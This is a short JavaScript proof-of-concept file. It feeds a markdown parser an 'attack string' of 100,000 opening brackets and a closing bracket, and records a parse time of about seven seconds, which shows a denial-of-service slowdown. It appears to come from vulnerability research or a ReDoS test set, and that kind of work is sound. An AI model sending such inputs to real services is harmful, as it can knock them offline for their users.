const { parse } = require("./markdown.js");

//Attack String :""+"["*100000+"]"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "[";
}
str += "]";

var result = parse(str);

// real    0m6.958s
// user    0m6.930s
// sys     0m0.010s

//将文件中的所有?.修改为了.
